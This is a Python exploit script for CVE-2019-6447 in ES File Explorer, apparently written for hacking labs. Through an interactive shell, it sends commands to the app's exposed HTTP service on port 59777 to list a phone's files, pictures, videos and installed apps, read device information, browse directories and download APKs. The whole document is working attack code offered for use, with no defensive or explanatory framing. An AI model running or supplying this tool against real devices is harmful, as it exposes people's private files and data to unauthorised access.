#!/usr/bin/python3

import requests, sys, signal, argparse, re, os

def argp():
	parser = argparse.ArgumentParser(description="ES File Explorer <= v4.1.9.7.4 <--> CVE-2019-6447")
	group_ex = parser.add_mutually_exclusive_group()
	group_ex.add_argument("-l", "--list", help="List all command avaible", action="store_true", default=False)
	group_ex.add_argument("-t", "--target", help="Target ip", metavar="10.10.10.247", default=False)
	parser.add_argument("-s", "--show", help="Show files, folders and packages names", action="store_true", default=False)
	args = parser.parse_args()
	return args

def closeSignal(sig, frame):
	print("\n\n[*]Exiting...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, closeSignal)

burp = {"http" : "http://127.0.0.1:8080"}

def showList():
	print("\t\t[*] Avaible commands:\n")
	print("- listFiles:       list all Files on the target cellphone")
	print('- listPics:        List all the pictures')
	print('- listVideos:      List all the videos')
	print('- listAudios:      List all the audio files')
	print('- listApps:        List all the apps installed')
	print('- listAppsSystem:  List all the system apps')
	print('- listAppsPhone:   List all the phone apps')
	print('- listAppsSdcard:  List all the sdcard')
	print('- listAppsAll:     List all the apps installed (system apps included)')
	print('- getDeviceInfo:   Get device info')
	print('- appPull:         Pull an app from the device')
	print('- getAppThumbnail: Get the icon of an app')
	print("\n\t\t[*] Extra commands added:\n")
	print("- cd <folder>: change directory to the specified path, example: cd /sdcard, http://10.10.10.247:59777/sdcard")
	print("- cd: go back to the beginning of everything, example: cd, http://10.10.10.247:59777")
	print("- cd .. : Does the same as cd .., goes one path back, cd ../../../ is not allowed, only cd ..")
	print("- pwd: shows the current directory you are in")
	print("- exit: exit from the program")
	print("- clear: clear the screen")
	print("- ls: List the available commands")

def appPullfun(pkg_name, filename):
	payload = {"command" : "appPull", "appPackageName" : pkg_name}
	try:
		print("[*] Sending appPull command...")
		r = requests.post(target, json=payload)
		print(f"[*] Server Responded with: {r.status_code}")
		print(f"[*] This could take a while...")
		if "NameNotFoundException" in r.text:
			print("[!] Package Name Not Found!\n")
			return

		with open(filename + ".apk", "wb") as f:
			print(f"[*] Saving content of {pkg_name} on file {filename}.apk\n")
			f.write(r.content) # Content es para el modo b
			print("[*] Successfully saved:" + os.getcwd() + f"/{apk_name}.apk\n")

	except Exception as e:
		print(f"[!] An exception ocurred\n[*] Exception: {e}\n\n")
		sys.exit(1)

def thumbnail(pkg_name, filename):
	payload = {"command" : "getAppThumbnail", "appPackageName" : pkg_name}
	try:
		print("[*] Sending getAppThumbnail command...")
		r = requests.post(target, json=payload)
		print(f"[*] Server Responded with: {r.status_code}")
		if "NameNotFoundException" in r.text:
			print("[!] Package Name Not Found!\n")
			return

		if "cannot be cast to" in r.text:
			print(f"[!] Can't get the {pkg_name} thumbnail package...\n{r.text}\n")
			return

		with open(filename + ".png", "wb") as f:
			print(f"[*] Saving Thumbnail of {pkg_name} in {filename}.png\n")
			f.write(r.content)
			print("[*] Successfully saved:" + os.getcwd() + f"/{filename}.png\n")

	except Exception as e:
		print(f"[!] An exception ocurred\n[*] Exception: {e}\n\n[!] Exiting...\n")
		sys.exit(1)

def makeRequest(cmd, pkg_name=False, filename=False):
	if cmd == "appPull":
		appPullfun(pkg_name, filename)
		return

	if cmd == "getAppThumbnail":
		thumbnail(pkg_name, filename)
		return

	else:
		payload = {"command" : cmd}
		try:
			r = requests.post(target, json=payload)
			response = re.sub("\{|\}|\[|\]|\"", "", r.text)
			if response == "\r\n":
				return
			response = re.sub("\, \,", "", response)
			response = re.findall("(?:.*?).+\r\n", response) #\r\n Son los saltos de linea
			if not response:
				print(r.text)

			else:
				if show:
					folder_counts, folder_names = 0, []
					file_counts, file_names = 0, []
					package_counts, package_names = 0, []

					for line in response:
						if "type:folder" in line:
							foldername = re.findall("name:(.*?),", line)[0]
							folder_names.append(foldername)
							folder_counts += 1

						if "type:file" in line:
							filename = re.findall("name:(.*?),", line)[0]
							file_names.append(filename)
							file_counts += 1

						if "packageName" in line:
							package_counts += 1
							packageName = re.findall("packageName:(.*?), ", line)[0]
							package_names.append(packageName)
						line = line.replace(", ", "\n")
						print(line)

					if file_counts:
						print(f"[*] Total Files Found: {file_counts}\n")
						print(f"[-] File Names:", end=" ")
						for files in file_names:
							print(files, end=", ")
						print("\n")

					if folder_counts:
						print(f"[*] Total Folders Found: {folder_counts}\n")
						print(f"[-] Folder Names:", end=" ")
						for folders in folder_names:
							print(folders, end=", ")
						print("\n")

					if package_counts:
						print(f"[*] Total Packages Found: {package_counts}\n")
						print(f"[-] Packages Names:", end=" ")
						for pkg in package_names:
							print(pkg, end=", ")
						print("\n")
				else:
					for line in response:
						line = line.replace(", ", "\n")
						print(line)

		except Exception as e:
				print(f"[!] An exception ocurred\n[*] Exception: {e}\n\n")
				sys.exit(1)

if __name__ == '__main__':

	args = argp()
	args.target = args.target
	target = args.target
	list = args.list
	show = args.show

	if list:
		showList()
		sys.exit(0)


	if target:
		args.target = "http://" + args.target + ":59777"
		target = args.target

		try:
			r = requests.get(target, timeout=7)
			if r.status_code != 200:
				print(f"[!] Status Code: {r.status_code}")
				print("[*] ls to show available commands\n")

			if r.status_code == 404:
				print(f"[!] Server Responded with 404\n[*] Exiting...\n")
				sys.exit(1)

		except requests.exceptions.Timeout:
			print("[*] Timeout! The server did not respond...")
			sys.exit(1)

		except Exception as e:
			print(f"[!] An exception ocurred\n[*] Exception: {e}\n\n[!] Exiting...\n")
			sys.exit(1)

		print("Happy Hacking ;D\n")
		while True:
			cmd = input("command> ")

			if cmd.startswith("cd"):
				path = cmd.replace("cd", "").strip(" /")

				if path == "..":
					back = re.findall(".+(\/.*?)$", target)[0]
					leng = len(back)
					if back.endswith("59777"):
						print("[*] Error, you can't go back\n")
						continue
					target = target[0:-leng]
					print("[*] Actual path: " + target)
					continue

				if path: # Si da true es porque hay algo en el path, que sera el directorio
					target = target + "/" + path
					print(f"[*] Actual directory: {target}, cd to go back to the beginning: {args.target}, pwd to show the actual path.\n")
					continue

				else: # De lo contrario el usuario querra volver para el principio
					target = args.target
					print(f"[*] Actual directory {target}, in the beginning.\n")
					continue

			if cmd == "pwd":
				print(f"{target}\n")
				continue

			if cmd == "exit":
				print("\n\n[*] Exiting...\n")
				sys.exit(0)

			if cmd == "clear":
				os.system("clear")
				continue

			if cmd.startswith("ls"):
				showList()
				print()
				continue

			if cmd == "appPull":
				pkg = input(">>> Package Name> ")
				if not pkg:
					print("[!] PackageName is necessary\n")
					continue

				apk_name = input(">>> File to save> ")
				if not apk_name:
					print("[!] FileName is necessary\n")
					continue
				makeRequest(cmd, pkg, apk_name)
				continue

			if cmd == "getAppThumbnail":
				pkg = input(">>> Package Name> ")
				if not pkg:
					print("[!] Package Name is necessary\n")
					continue

				jpg_name = input(">>> File to save> ")
				if not jpg_name:
					print("[!] Filename is necessary\n")
					continue
				makeRequest(cmd, pkg, jpg_name)
				continue

			makeRequest(cmd)